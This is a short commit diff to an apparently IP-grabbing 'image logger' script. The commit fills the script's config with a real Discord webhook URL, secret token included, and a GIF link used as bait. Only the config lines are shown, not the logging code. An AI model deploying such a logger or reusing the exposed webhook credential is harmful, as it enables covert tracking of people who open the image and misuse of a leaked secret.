0da641a1620b8728e57f511c0de618dfc010d84c
Jirmon1 <rickjameeh@gmail.com>
2025-07-09 12:56:54 +1000

    Update image.py

--- image/api/image.py
+++ image/api/image.py
@@ -13,8 +13,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1392337358099189880/ZzMXNx_XoMkj2VzWwzrfyc4nB5DNZWyNfrzoKQlTEaKIMkZd7SimTAkDqHy4pOwj8E-k",
+    "image": "https://media1.tenor.com/m/wVkmA4iVDA4AAAAd/zelda-zelda-rock.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
